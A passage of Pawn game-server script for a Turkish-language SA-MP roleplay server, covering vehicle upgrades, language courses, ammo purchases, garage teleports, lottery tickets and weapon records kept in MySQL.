    }
    if(SectigiImmo[playerid] > Arac[GetPlayerVehicleID(playerid)][aimmo])
	{
		switch(SectigiImmo[playerid])
		{
		    case 1: __fiyat += 500;
		    case 2: __fiyat += 1000;
		    case 3: __fiyat += 1750;
		}
	}
	new _htext[4],_h2text[4];
	switch(SectigiHizSabit[playerid])
	{
	    case 0: _htext = "Yok";
	    case 1: _htext = "Var";
	}
	switch(Arac[GetPlayerVehicleID(playerid)][ahizsabit])
	{
	    case 0: _h2text = "Yok";
	    case 1: _h2text = "Var";
	}
	new _vid=GetPlayerVehicleID(playerid);
	format(mstring, sizeof(mstring), "Özellik\tGeliþtirme\tVar Olan\nHýz Sabitleme:\t%s\t(%s)\nKilit Seviye:\t%d\t(%d)\nAlarm Seviye:\t%d\t(%d)\nImmobilizer Seviye:\t%d\t(%d)\n\n"NOKTA" Onayla ("DOLAR"$"C1"%d)",
	_htext,
	_h2text,
	SectigiKilit[playerid],
	Arac[_vid][akilittip],
	SectigiAlarm[playerid],
	Arac[_vid][aalarm],
	SectigiImmo[playerid],
	Arac[_vid][aimmo],
	__fiyat);
	SetPVarInt(playerid, "GelistirFiyat", __fiyat);
	ShowPlayerDialog(playerid, 313, DIALOG_STYLE_TABLIST_HEADERS, nstring, mstring, "Seç", "Ýptal");
}

PBAyarla(playerid)
{
	switch(gPBTeam[playerid])
	{
		case 1:
		{
  			SetPlayerPos(playerid, 793.9719,-2461.8828,1089.3918);
	        SetPlayerInterior(playerid, 1);
	        SetPlayerVirtualWorld(playerid, 1);
	        SetPlayerSkin(playerid, 287);
	        SetPlayerFacingAngle(playerid, 289.9264);
	        SetPlayerTeam(playerid, 3);
	        //Bilgi(playerid, "A Takýmýný seçtiniz.");
     	}
	    case 2:
		{
			SetPlayerPos(playerid, 1162.6658,-2352.6187,1089.3176);
	        SetPlayerInterior(playerid, 1);
	        SetPlayerVirtualWorld(playerid, 1);
	        SetPlayerSkin(playerid, 285);
	        SetPlayerFacingAngle(playerid, 89.1144);
	        SetPlayerTeam(playerid, 4);
	        //Bilgi(playerid, "B Takýmýný seçtiniz.");
		}
	}
}

CMD:dillerim(playerid, params[])
{
    if(!Girdi[playerid]) return 1;
    new _atext[24],_atext2[24],_ctext[24],_ftext[24],_itext[24],_itext2[24],_itext3[24],_jtext[24],_rtext[24],
	_itext4[24],_ytext[24],_etext[24],_stext[24],
	_itext5[24],_ptext[24],_stext2[24],_atext3[24];
	if(Karakter[playerid][dil] == 1) _atext = ""C2"(Ana Dil)";
	else format(_atext, 24, "%d%", Karakter[playerid][alm]*10);

	if(Karakter[playerid][dil] == 2) _atext2 = ""C2"(Ana Dil)";
	else format(_atext2, 24, "%d%", Karakter[playerid][arp]*10);

	if(Karakter[playerid][dil] == 3) _ctext = ""C2"(Ana Dil)";
	else format(_ctext, 24, "%d%", Karakter[playerid][cin]*10);

	if(Karakter[playerid][dil] == 4) _ftext = ""C2"(Ana Dil)";
	else format(_ftext, 24, "%d%", Karakter[playerid][fra]*10);

	if(Karakter[playerid][dil] == 5) _itext2 = ""C2"(Ana Dil)";
	else format(_itext2, 24, "%d%", Karakter[playerid][isp]*10);

	if(Karakter[playerid][dil] == 6) _itext3 = ""C2"(Ana Dil)";
	else format(_itext3, 24, "%d%", Karakter[playerid][ita]*10);

	if(Karakter[playerid][dil] == 7) _jtext = ""C2"(Ana Dil)";
	else format(_jtext, 24, "%d%", Karakter[playerid][japon]*10);

	if(Karakter[playerid][dil] == 8) _rtext = ""C2"(Ana Dil)";
	else format(_rtext, 24, "%d%", Karakter[playerid][rus]*10);

	if(Karakter[playerid][dil] == 9) _itext4 = ""C2"(Ana Dil)";
	else format(_itext4, 24, "%d%", Karakter[playerid][ibra]*10);

	if(Karakter[playerid][dil] == 10) _ytext = ""C2"(Ana Dil)";
	else format(_ytext, 24, "%d%", Karakter[playerid][yunan]*10);

	if(Karakter[playerid][dil] == 11) _etext = ""C2"(Ana Dil)";
	else format(_etext, 24, "%d%", Karakter[playerid][ermen]*10);

	if(Karakter[playerid][dil] == 12) _stext = ""C2"(Ana Dil)";
	else format(_stext, 24, "%d%", Karakter[playerid][slovak]*10);

	if(Karakter[playerid][dil] == 13) _stext = ""C2"(Ana Dil)";
	else format(_itext5, 24, "%d%", Karakter[playerid][irlan]*10);

	if(Karakter[playerid][dil] == 14) _stext = ""C2"(Ana Dil)";
	else format(_ptext, 24, "%d%", Karakter[playerid][porte]*10);

	if(Karakter[playerid][dil] == 15) _stext = ""C2"(Ana Dil)";
	else format(_stext2, 24, "%d%", Karakter[playerid][sirp]*10);

	if(Karakter[playerid][dil] == 16) _stext = ""C2"(Ana Dil)";
	else format(_atext3, 24, "%d%", Karakter[playerid][arnavut]*10);

	if(Karakter[playerid][dil] == 0) _itext = ""C2"(Ana Dil)";
	else _itext = "100%";
	new mstring[2048];
	format(mstring, sizeof(mstring), "Dil\tDurum\nAlmanca\t%s\nArapça\t%s\nÇince\t%s\nFransýzca\t%s",
	_atext,
	_atext2,
	_ctext,
	_ftext);
	format(mstring, sizeof(mstring), "%s\nÝngilizce\t%s\nÝspanyolca\t%s\nÝtalyanca\t%s\nJaponca\t%s",
	mstring,
	_itext,
	_itext2,
	_itext3,
	_jtext);
	format(mstring, sizeof(mstring), "%s\nRusça\t\t%s",
	mstring,
	_rtext);
	format(mstring, sizeof(mstring), "%s\nÝbranice\t%s\nYunanca\t%s\nErmenice\t%s\nSlovakça\t%s",
	mstring,
	_itext4,
	_ytext,
	_etext,
	_stext);
	format(mstring, sizeof(mstring), "%s\nÝrlandaca\t%s\nPortekizce\t%s\nSýrpça\t%s\nArnavutça\t%s",
	mstring,
	_itext5,
	_ptext,
	_stext2,
	_atext3);
	ShowPlayerDialog(playerid, 297, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Dillerim", mstring, "Çýk", "");
    return 1;
}

CMD:dilogren(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(!IsPlayerInRangeOfPoint(playerid, 10, 1491.1432,1306.9702,1093.2891) && GetPlayerVirtualWorld(playerid) != 473 && GetPlayerInterior(playerid) != 3) return Hata(playerid, "Dil kursunda deðilsiniz.");
    new _atext[24],_atext2[24],_ctext[24],_ftext[24],_itext[24],_itext2[24],_itext3[24],_jtext[24],_rtext[24],
	_itext4[24],_ytext[24],_etext[24],_stext[24],
	_itext5[24],_ptext[24],_stext2[24],_atext3[24];
	if(Karakter[playerid][dil] == 1) _atext = ""C2"(Ana Dil)";
	else format(_atext, 24, "%d%", Karakter[playerid][alm]*10);

	if(Karakter[playerid][dil] == 2) _atext2 = ""C2"(Ana Dil)";
	else format(_atext2, 24, "%d%", Karakter[playerid][arp]*10);

	if(Karakter[playerid][dil] == 3) _ctext = ""C2"(Ana Dil)";
	else format(_ctext, 24, "%d%", Karakter[playerid][cin]*10);

	if(Karakter[playerid][dil] == 4) _ftext = ""C2"(Ana Dil)";
	else format(_ftext, 24, "%d%", Karakter[playerid][fra]*10);

	if(Karakter[playerid][dil] == 5) _itext2 = ""C2"(Ana Dil)";
	else format(_itext2, 24, "%d%", Karakter[playerid][isp]*10);

	if(Karakter[playerid][dil] == 6) _itext3 = ""C2"(Ana Dil)";
	else format(_itext3, 24, "%d%", Karakter[playerid][ita]*10);

	if(Karakter[playerid][dil] == 7) _jtext = ""C2"(Ana Dil)";
	else format(_jtext, 24, "%d%", Karakter[playerid][japon]*10);

	if(Karakter[playerid][dil] == 8) _rtext = ""C2"(Ana Dil)";
	else format(_rtext, 24, "%d%", Karakter[playerid][rus]*10);

	if(Karakter[playerid][dil] == 9) _itext4 = ""C2"(Ana Dil)";
	else format(_itext4, 24, "%d%", Karakter[playerid][ibra]*10);

	if(Karakter[playerid][dil] == 10) _ytext = ""C2"(Ana Dil)";
	else format(_ytext, 24, "%d%", Karakter[playerid][yunan]*10);

	if(Karakter[playerid][dil] == 11) _etext = ""C2"(Ana Dil)";
	else format(_etext, 24, "%d%", Karakter[playerid][ermen]*10);

	if(Karakter[playerid][dil] == 12) _stext = ""C2"(Ana Dil)";
	else format(_stext, 24, "%d%", Karakter[playerid][slovak]*10);

	if(Karakter[playerid][dil] == 13) _stext = ""C2"(Ana Dil)";
	else format(_itext5, 24, "%d%", Karakter[playerid][irlan]*10);

	if(Karakter[playerid][dil] == 14) _stext = ""C2"(Ana Dil)";
	else format(_ptext, 24, "%d%", Karakter[playerid][porte]*10);

	if(Karakter[playerid][dil] == 15) _stext = ""C2"(Ana Dil)";
	else format(_stext2, 24, "%d%", Karakter[playerid][sirp]*10);

	if(Karakter[playerid][dil] == 16) _stext = ""C2"(Ana Dil)";
	else format(_atext3, 24, "%d%", Karakter[playerid][arnavut]*10);

	if(Karakter[playerid][dil] == 0) _itext = ""C2"(Ana Dil)";
	else _itext = "100%";
	new mstring[2048];
	format(mstring, sizeof(mstring), "Dil\tDurum\tFiyat\nAlmanca\t%s\t"DOLAR"$"C1"5000\nArapça\t%s\t"DOLAR"$"C1"5000\nÇince\t%s\t"DOLAR"$"C1"5000\nFransýzca\t%s\t"DOLAR"$"C1"5000",
		_atext,
		_atext2,
		_ctext,
		_ftext);
	format(mstring, sizeof(mstring), "%s\nÝngilizce\t%s\t"DOLAR"$"C1"5000\nÝspanyolca\t%s\t"DOLAR"$"C1"5000\nÝtalyanca\t%s\t"DOLAR"$"C1"5000\nJaponca\t%s\t"DOLAR"$"C1"5000",
		mstring,
		_itext,
		_itext2,
		_itext3,
		_jtext);
	format(mstring, sizeof(mstring), "%s\nRusça\t%s\t"DOLAR"$"C1"5000",
		mstring,
		_rtext);
	format(mstring, sizeof(mstring), "%s\nÝbranice\t%s\t"DOLAR"$"C1"5000\nYunanca\t%s\t"DOLAR"$"C1"5000\nErmenice\t%s\t"DOLAR"$"C1"5000\nSlovakça\t%s\t"DOLAR"$"C1"5000",
		mstring,
		_itext4,
		_ytext,
		_etext,
		_stext);
	format(mstring, sizeof(mstring), "%s\nÝrlandaca\t%s\t"DOLAR"$"C1"5000\nPortekizce\t%s\t"DOLAR"$"C1"5000\nSýrpça\t%s\t"DOLAR"$"C1"5000\nArnavutça\t%s\t"DOLAR"$"C1"5000",
		mstring,
		_itext5,
		_ptext,
		_stext2,
		_atext3);
	ShowPlayerDialog(playerid, 315, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Dil Kursu", mstring, "Öðren", "Ýptal");
	return 1;
}

forward DilOgren(playerid, _dil);
public DilOgren(playerid, _dil)
{
	new mstring[128];
	format(mstring, sizeof(mstring), "%s dersiniz bitti.",DilName2(_dil));
	Bilgi(playerid, mstring);
	switch(_dil)
	{
		case 1: Karakter[playerid][alm]++;
		case 2: Karakter[playerid][arp]++;
		case 3: Karakter[playerid][cin]++;
		case 4: Karakter[playerid][fra]++;
		case 5: Karakter[playerid][isp]++;
		case 6: Karakter[playerid][ita]++;
		case 7: Karakter[playerid][japon]++;
		case 8: Karakter[playerid][rus]++;
		case 9: Karakter[playerid][ibra]++;
		case 10: Karakter[playerid][yunan]++;
		case 11: Karakter[playerid][ermen]++;
		case 12: Karakter[playerid][slovak]++;
		case 13: Karakter[playerid][irlan]++;
		case 14: Karakter[playerid][porte]++;
		case 15: Karakter[playerid][sirp]++;
		case 16: Karakter[playerid][arnavut]++;
	}
}

DilKontrol(playerid, giveplayerid)
{
	new _dil = GetPVarInt(playerid, "SectigiDil");
	if(_dil == Karakter[giveplayerid][dil]) return 1;
	else if(_dil == 1 && Karakter[giveplayerid][alm] == 10) return 1;
	else if(_dil == 2 && Karakter[giveplayerid][arp] == 10) return 1;
	else if(_dil == 3 && Karakter[giveplayerid][cin] == 10) return 1;
	else if(_dil == 4 && Karakter[giveplayerid][fra] == 10) return 1;
	else if(_dil == 5 && Karakter[giveplayerid][isp] == 10) return 1;
	else if(_dil == 6 && Karakter[giveplayerid][ita] == 10) return 1;
	else if(_dil == 7 && Karakter[giveplayerid][japon] == 10) return 1;
	else if(_dil == 8 && Karakter[giveplayerid][rus] == 10) return 1;
	else if(_dil == 9 && Karakter[giveplayerid][ibra] == 10) return 1;
	else if(_dil == 10 && Karakter[giveplayerid][yunan] == 10) return 1;
	else if(_dil == 11 && Karakter[giveplayerid][ermen] == 10) return 1;
	else if(_dil == 12 && Karakter[giveplayerid][slovak] == 10) return 1;
	else if(_dil == 13 && Karakter[giveplayerid][irlan] == 10) return 1;
	else if(_dil == 14 && Karakter[giveplayerid][porte] == 10) return 1;
	else if(_dil == 15 && Karakter[giveplayerid][sirp] == 10) return 1;
	else if(_dil == 16 && Karakter[giveplayerid][arnavut] == 10) return 1;
	return 0;
}

CMD:mermial(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	for(new ixx=0;ixx<sizeof(MermiPozisyonlari);ixx++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3, MermiPozisyonlari[ixx][0], MermiPozisyonlari[ixx][1], MermiPozisyonlari[ixx][2]) && GetPlayerInterior(playerid) == MermiPozisyonlari[ixx][3] && GetPlayerVirtualWorld(playerid) == MermiPozisyonlari[ixx][4])
		{
			new _sno,mstring[128];
			if(sscanf(params,"d",_sno)) return Kullanim(playerid, "/mermial [SilahNo]");
			foreach(new i : Guns)
			{
			    if(OyuncuSilah[i][no] == _sno)
			    {
			        if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid])
			        {
						if(OyuncuSilah[i][durum] == 1)
						{
						    for(new ix;ix < sizeof(MermiVerileri);ix++)
						    {
						        if(MermiVerileri[ix][0] == OyuncuSilah[i][silahid])
						        {
						            RemovePlayerWeapon(playerid, OyuncuSilah[i][silahid]);
						            SilahKullaniyor[playerid] = 0;
						            format(mstring, sizeof(mstring), ""C2"Silah Adý:\t "C1"%s\n"C2"Mermi:\t\t "C1"%d\n"C2"Fiyat:\t\t "DOLAR"$"C1"%d",SilahIsim(MermiVerileri[ix][0]),MermiVerileri[ix][1],MermiVerileri[ix][2]);
								    ShowPlayerDialog(playerid, 316, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Mermi Al", mstring, "Satýn Al", "Ýptal");
									SetPVarInt(playerid, "MermiAlNo", _sno);
						        }
						    }
	                        return 1;
						}
						Hata(playerid, "Silah üzerinizde deðil.");
			        	return 1;
					}
			        Hata(playerid, "Silah üzerinizde deðil.");
			        return 1;
				}
			}
			Hata(playerid, "Silah no bulunamadý.");
			return 1;
		}
	}
	Hata(playerid, "Mermi alma yerinde deðilsiniz.");
	return 1;
}

GarajDuzenle(playerid, id)
{
	new mstring[512],_text[32],_text2[32];
	if(Garaj[id][gsahip] == -1)
	{
	    _text = "Yok";
	}
	else
	{
		format(_text, 32, "%s", SQLFromName(Garaj[id][gsahip]));
	}
	if(Garaj[id][gbirlik] == -1)
	{
	    _text2 = "Yok";
	}
	else
	{
	    format(_text2, 32, "%s", Birlik[Garaj[id][gbirlik]][fisim]);
	}
	format(mstring, sizeof(mstring), "ID:\t%d\nX Pos:\t%f\nY Pos:\t%f\nZ Pos:\t%f\nVirtualWorld:\t%d\nÝnterior:\t%d\nÝç Ýnterior:\t%d\nSahip:\t%s\nBirlik:\t%s\nÝsim:\t%s\nKilit:\t%d\nAraç Pos:",
	id,
	Garaj[id][gx],
	Garaj[id][gy],
	Garaj[id][gz],
	Garaj[id][gvw],
	Garaj[id][gint],
	Garaj[id][gicint],
	_text,
	_text2,
	Garaj[id][gisim],
	Garaj[id][gkilit]);
	SetPVarInt(playerid, "GDuzenle", id);
	return ShowPlayerDialog(playerid, 317, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Garaj Düzenle", mstring, "Düzenle", "Ýptal");
}

IsyeriGarajGonder(playerid, isid, _tip)
{
	if(_tip == 1)
	{
	    if(IsPlayerInAnyVehicle(playerid))
		{
		    new vid = GetPlayerVehicleID(playerid);
		    foreach(new i : Player)
			{
			    if(IsPlayerInVehicle(i, vid) && Girdi[i])
			    {
		    		DONDUR(i);
		   			SetTimerEx("UnfreezeTimer", 3500, false, "u", i);
		   			if(GetPlayerState(i) != 2) SetPVarInt(i, "gSeat", GetPlayerVehicleSeat(i));
		   			SetPlayerInterior(i, 1);
		   			SetPlayerVirtualWorld(i, isid);
		   			SetPVarInt(i, "iGarajArac", vid);
				}
			}
			SetVehiclePosEx(vid, Isyeri[isid][acikisx], Isyeri[isid][acikisy], Isyeri[isid][acikisz]);
			SetVehicleZAngle(vid, Isyeri[isid][acikisang]);
			SetVehicleVirtualWorld(vid, isid);
			LinkVehicleToInterior(vid, 1);
			foreach(new i : Player)
			{
			    if(GetPVarInt(i, "iGarajArac") == vid)
			    {
			        PutPlayerInVehicle(i, vid, GetPVarInt(i, "gSeat"));
			        DeletePVar(i, "iGarajArac");
				}
			}
		}
	}
	else
	{
	    if(IsPlayerInAnyVehicle(playerid))
		{
		    new vid = GetPlayerVehicleID(playerid);
		    foreach(new i : Player)
			{
			    if(IsPlayerInVehicle(i, vid) && Girdi[i])
			    {
		    		DONDUR(i);
		   			SetTimerEx("UnfreezeTimer", 3500, false, "u", i);
		   			if(GetPlayerState(i) != 2) SetPVarInt(i, "gSeat", GetPlayerVehicleSeat(i));
		   			SetPlayerInterior(i, 0);
		   			SetPlayerVirtualWorld(i, 0);
		   			SetPVarInt(i, "iGarajArac", vid);
				}
			}
			SetVehiclePosEx(vid, Isyeri[isid][agirisx], Isyeri[isid][agirisy], Isyeri[isid][agirisz]);
			SetVehicleZAngle(vid, Isyeri[isid][agirisang]);
			SetVehicleVirtualWorld(vid, 0);
			LinkVehicleToInterior(vid, 0);
			foreach(new i : Player)
			{
			    if(GetPVarInt(i, "iGarajArac") == vid)
			    {
			        PutPlayerInVehicle(i, vid, GetPVarInt(i, "gSeat"));
			        DeletePVar(i, "iGarajArac");
				}
			}
		}
	}
}

GarajGonder(playerid, id)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
	    new vid = GetPlayerVehicleID(playerid);
		if(Garaj[id][gicint] == 1)
		{
			SetVehiclePosEx(vid, 308.4695,-1497.8199,24.3055);
			SetVehicleZAngle(vid, 327.6852);
			SetVehicleVirtualWorld(vid, id);
			LinkVehicleToInterior(vid, 1);
			foreach(new i : Player)
			{
				if(Girdi[i] && GetPlayerVehicleID(i) == vid)
				{
					SetPlayerVirtualWorld(i, id);
					SetPlayerInterior(i, 1);
					DONDUR(i);
					SetTimerEx("GarajGonder2", 750, false, "iii", i, id, vid);
					if(GetPlayerState(i) != 2) SetPVarInt(i, "gSeat", GetPlayerVehicleSeat(i));
					gGarajGirdi[i] = true;
				}
			}
		}
		else if(Garaj[id][gicint] == 2)
		{
		    SetVehiclePosEx(vid, 286.8311,-1537.9094,24.3008);
			SetVehicleZAngle(vid, 324.8323);
			SetVehicleVirtualWorld(vid, id);
			LinkVehicleToInterior(vid, 1);
			foreach(new i : Player)
			{
				if(Girdi[i] && GetPlayerVehicleID(i) == vid)
				{
					SetPlayerVirtualWorld(i, id);
					SetPlayerInterior(i, 1);
					DONDUR(i);
					SetTimerEx("GarajGonder2", 750, false, "iii", i, id, vid);
					if(GetPlayerState(i) != 2) SetPVarInt(i, "gSeat", GetPlayerVehicleSeat(i));
					gGarajGirdi[i] = true;
				}
			}
		}
		else if(Garaj[id][gicint] == 3)
		{
		    SetVehiclePosEx(vid, 2299.6672,2495.4089,-7.7479);
			SetVehicleZAngle(vid, 269.6500);
			SetVehicleVirtualWorld(vid, id);
			LinkVehicleToInterior(vid, 1);
			foreach(new i : Player)
			{
				if(Girdi[i] && GetPlayerVehicleID(i) == vid)
				{
					SetPlayerVirtualWorld(i, id);
					SetPlayerInterior(i, 1);
					DONDUR(i);
					SetTimerEx("GarajGonder2", 750, false, "iii", i, id, vid);
					if(GetPlayerState(i) != 2) SetPVarInt(i, "gSeat", GetPlayerVehicleSeat(i));
					gGarajGirdi[i] = true;
				}
			}
		}
	}
	else
	{
	    if(Garaj[id][gicint] == 1)
		{
   			SetPlayerPos(playerid, 315.6829,-1495.7094,25.3777);
   			SetPlayerFacingAngle(playerid, 147.1973);
			SetPlayerVirtualWorld(playerid, id);
			SetPlayerInterior(playerid, 1);
		}
		else if(Garaj[id][gicint] == 2)
		{
      		SetPlayerPos(playerid, 304.0780,-1530.8527,24.9219);
      		SetPlayerFacingAngle(playerid, 142.6853);
			SetPlayerVirtualWorld(playerid, id);
			SetPlayerInterior(playerid, 1);
		}
		else if(Garaj[id][gicint] == 3)
		{
      		SetPlayerPos(playerid, 2294.6865,2501.3848,-7.4525);
      		SetPlayerFacingAngle(playerid, 271.2945);
   			SetPlayerVirtualWorld(playerid, id);
			SetPlayerInterior(playerid, 1);
		}
		DONDUR(playerid);
		SetTimerEx("GarajGonder2", 750, false, "iii", playerid, id, 0);
		gGarajGirdi[playerid] = true;
	}
}

forward GarajGonder2(playerid, id, vid);
public GarajGonder2(playerid, id, vid)
{
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2)
	{
		if(Garaj[id][gicint] == 1)
		{
			SetVehiclePosEx(vid, 308.4695,-1497.8199,24.3055);
			SetVehicleZAngle(vid, 327.6852);
		}
		else if(Garaj[id][gicint] == 2)
		{
		    SetVehiclePosEx(vid, 286.8311,-1537.9094,24.3008);
			SetVehicleZAngle(vid, 324.8323);
		}
		else if(Garaj[id][gicint] == 3)
		{
		    SetVehiclePosEx(vid, 2299.6672,2495.4089,-7.7479);
			SetVehicleZAngle(vid, 269.6500);
		}
	}
	else
	{
	}
	UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 2750, false, "u", playerid);
	new query[128];
	format(query, sizeof(query), "UPDATE `karakterler` SET `garajda` = '1' WHERE `id` = '%d'",Karakter[playerid][sqlid]);
	mysql_tquery(1,query);
}

BiletVer(playerid, biletid, btip)
{
	new query[128];
	format(query, sizeof(query), "INSERT INTO `piyango` (`sqlid`,`piyangono`,`tip`) VALUES ('%d','%d','%d')",Karakter[playerid][sqlid],biletid,btip);
	mysql_tquery(1,query);
}

CMD:asecim(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	switch(aSecim)
	{
	    case 0:
	    {
	        aSecim = 1;
	        Bilgi(playerid, "Þuan oyuncular oy kullanabilir.");
	    }
	    case 1:
	    {
	        aSecim = 0;
	        Bilgi(playerid, "Þuan oyuncular oy kullanamaz.");
	    }
	}
	return 1;
}

/*CMD:kbeta(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(KapaliBetaKontrol(playerid)) return Hata(playerid, "Zaten kapalý beta baþarýmý kazanmýþsýnýz.");
	Bilgi(playerid, "Kapalý Beta baþarýmýný kazandýnýz.");
	new query[128];
    format(query, sizeof(query), "INSERT INTO `basarim` (`forumnick`,`kbeta`) VALUES ('%s','1') ON DUPLICATE KEY UPDATE `kbeta` = '1'", Karakter[playerid][nick]);
    mysql_tquery(1,query);
	return 1;
}

stock KapaliBetaKontrol(playerid)
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `basarim` WHERE `forumnick` = '%s'", Karakter[playerid][nick]);
    new Cache:cache = mysql_query(query,true);
	if(!cache_get_row_count())
	{
		cache_delete(cache);
		return 0;
	}
	new rows, fields, _y;
	cache_get_data(rows, fields, g_iHandle);
	_y = cache_get_field_content_int(0,"kbeta");
	cache_delete(cache);
	if(_y == 0) return 0;
	return 1;
}*/

stock SilahYerNoCek(_sqlid)
{
	new query[128];
    format(query, sizeof(query), "SELECT * FROM `silahyer` WHERE `id` = '%d'", _sqlid);
    new Cache:cache = mysql_query(query,true);
	new rows, fields, _no;
	cache_get_data(rows, fields, g_iHandle);
	_no = cache_get_field_content_int(0,"no");
	cache_delete(cache);
	return _no;
}

stock OyuncuSilahKaydetEx(_silahid)
{
	new _query[512];
	format(_query, sizeof(_query), "UPDATE `silah` SET `no` = '%d', `silahid` = '%d', `mermi` = '%d', `oyuncuid` = '%d', `tip` = '%d', `durum` = '%d', `ruhsat` = '%d' WHERE `no` = '%d'",
	OyuncuSilah[_silahid][no],
	OyuncuSilah[_silahid][silahid],
	OyuncuSilah[_silahid][mermi],
	OyuncuSilah[_silahid][oyuncuid],
	OyuncuSilah[_silahid][silahtip],
	OyuncuSilah[_silahid][durum],
	OyuncuSilah[_silahid][ruhsat],
	OyuncuSilah[_silahid][no]);
	mysql_tquery(1,_query);
	return 1;
}

stock BirlikYetkili(playerid)
{
    new query[128];
	format(query, sizeof(query), "SELECT * FROM `birlikyetkili` WHERE `birlikid` = '%d' AND `sqlid` = '%d'", Karakter[playerid][birlik], Karakter[playerid][sqlid]);
	new Cache:cache = mysql_query(query, true);
 	if(cache_num_rows())
 	{
 	    cache_delete(cache);
 		return 1;
	}
	cache_delete(cache);
	return 0;
}

OyuncuSilahVer(vid, playerid, gun, ammo)
{
	new _silahno = randomEx(1,99998)+100000;
	new query[1024];
	format(query, sizeof(query), "SELECT * FROM `silah` WHERE `no` = '%d'", _silahno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
        cache_delete(cache);
        new _id;
        for(new i=1;i<MAX_SILAH;i++)
        {
            if(OyuncuSilah[i][no] == 0)
            {
				_id = i;
				break;
            }
        }
        OyuncuSilah[_id][no] = _silahno;
        OyuncuSilah[_id][oyuncuid] = Karakter[playerid][sqlid];
        OyuncuSilah[_id][silahid] = gun;
		OyuncuSilah[_id][mermi] = ammo;
		OyuncuSilah[_id][durum] = 1;
		Iter_Add(Guns, _id);
		switch(gun)
		{
		    case 22,24,25,28..33: OyuncuSilah[_id][silahtip] = 1;
		    default: OyuncuSilah[_id][silahtip] = 2;
		}
		format(query, sizeof(query), "INSERT INTO `silah` (`no`,`silahid`,`mermi`,`oyuncuid`,`tip`,`durum`,`veren`) VALUES ('%d','%d','%d','%d','%d','%d','%d')",
		OyuncuSilah[_id][no],
		OyuncuSilah[_id][silahid],
		OyuncuSilah[_id][mermi],
        OyuncuSilah[_id][oyuncuid],
		OyuncuSilah[_id][silahtip],
		OyuncuSilah[_id][durum],
		vid);
		mysql_tquery(1,query);
		return _id;
	}
	else
	{
		cache_delete(cache);
		OyuncuSilahVer(vid, playerid, gun, ammo);
	}
	return 1;
}

CMD:silahguncelle(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 5) return 1;
	for(new i = 0; i < MAX_SILAH; i++)
	{
        OyuncuSilah[i][no] = 0;
		OyuncuSilah[i][silahid] = 0;
		OyuncuSilah[i][mermi] = 0;
        OyuncuSilah[i][oyuncuid] = 0;
		OyuncuSilah[i][silahtip] = 0;
		OyuncuSilah[i][durum] = 0;
	}
	mysql_function_query(g_iHandle, "SELECT * FROM `silah`", true, "SilahYukle", "");
	Bilgi(playerid, "Silahlar güncellendi.");
	return 1;
}

CMD:akamerakaldir(playerid, params[])
{
    if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][adminlevel] < 1) return 1;
	new pid;
	if(sscanf(params,"d",pid)) return Kullanim(playerid, "/akamerakaldir [oyuncuID]");
	DestroyDynamicObject(gKamera[pid][0]);
 	DestroyDynamicObject(gKamera[pid][1]);
	DestroyDynamicObject(gKamera[pid][2]);
	DestroyDynamicObject(gKamera[pid][3]);
 	gKameraKurdu[pid] = false;
	Bilgi(playerid, "Kamerayý kaldýrdýnýz.");
	Bilgi(pid, "Kameranýz admin tarafýndan kaldýrýldý.");
	return 1;
}

CMD:ckamera(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != SANTV) return 1;
	if(Karakter[playerid][rutbe] > 5 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
	if(gKameraKurdu[playerid] == 0)
	{
	    new _tip;
	    if(sscanf(params,"d",_tip)) return Kullanim(playerid, "/ckamera [tip(1/2)]");
	    if(_tip == 1) {
	 	   	ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid , SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid,8,19615,6,-0.024000,-0.000000,0.020998,-16.799999,49.300083,-3.600008,0.851000,0.470998,0.834999 , 0xFF666666 , 0xFF666666);
			SetPlayerAttachedObject(playerid,9,19623,6,0.183999,-0.038000,-0.057000,70.100051,-2.600011,31.100006,1.000000,1.000000,1.000000 , 0xFF333333 , 0xFF333333);
	        IzleyenSayisi[playerid] = 0;
	        gKameraKurdu[playerid] = 1;
	    }
	    if(_tip == 2) {
			new Float:X, Float:Y, Float:Z, Float:_ang;
			GetPlayerPos(playerid, X, Y, Z);
			GetPlayerFacingAngle(playerid, _ang);
			gKameraPosE[playerid][0] = X;
			gKameraPosE[playerid][1] = Y;
			gKameraPosE[playerid][2] = Z;
			gKamera[playerid][0] = CreateDynamicObject(19623, X, Y+0.1, Z+0.1,   0.00000, 0.00000, -_ang);
			gKamera[playerid][1] = CreateDynamicObject(1270, X+0.15, Y, Z-0.7,   0.00000, -193.00000, -39.30000);
			gKamera[playerid][2] = CreateDynamicObject(1270, X-0.15, Y, Z-0.7,   0.00000, -193.00000, -139.37968);
			gKamera[playerid][3] = CreateDynamicObject(1270, X, Y+0.3, Z-0.7,   0.00000, -193.00000, 93.60000);
			gKameraKurdu[playerid] = 2;
			gKamera[playerid][4] = GetPlayerInterior(playerid);
			gKamera[playerid][5] = GetPlayerVirtualWorld(playerid);
			IzleyenSayisi[playerid] = 0;
			Bilgi(playerid, "Kamera kurdunuz.");
			Ipucu(playerid, "''/ckamerabakisacisi'' komutuyla kameranýn bakýþ açýsýný düzenleyin.");
		}
		else return Kullanim(playerid, "/ckamera [tip(1/2)]");
	}
	else
	{
	    if(gKameraKurdu[playerid] == 1)
	    {
	        ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid , SPECIAL_ACTION_NONE);
